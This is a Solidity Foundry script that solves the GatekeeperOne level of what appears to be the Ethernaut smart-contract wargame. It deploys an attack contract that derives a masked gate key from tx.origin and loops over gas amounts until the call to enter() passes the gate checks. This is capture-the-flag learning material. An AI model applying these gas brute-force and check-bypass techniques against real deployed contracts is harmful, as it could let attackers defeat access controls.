// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/13-GatekeeperOne/GatekeeperOne.sol";

contract ExploitScript is Script {
    GateKeeperAttack GateKeeperAttackContract;
    GatekeeperOne level13 = GatekeeperOne(payable(0x96794e22eBB21d0269739828Eab4Dbc53CdF327a));

    function run() public {
        vm.startBroadcast();
        GateKeeperAttackContract = new GateKeeperAttack();
        GateKeeperAttackContract.Attack(); 
        vm.stopBroadcast();
    }
}

contract GateKeeperAttack{

    GatekeeperOne level13 = GatekeeperOne(payable(0x96794e22eBB21d0269739828Eab4Dbc53CdF327a));

    function Attack() public {
        bytes8 _gateKey =  bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
    }
    }
}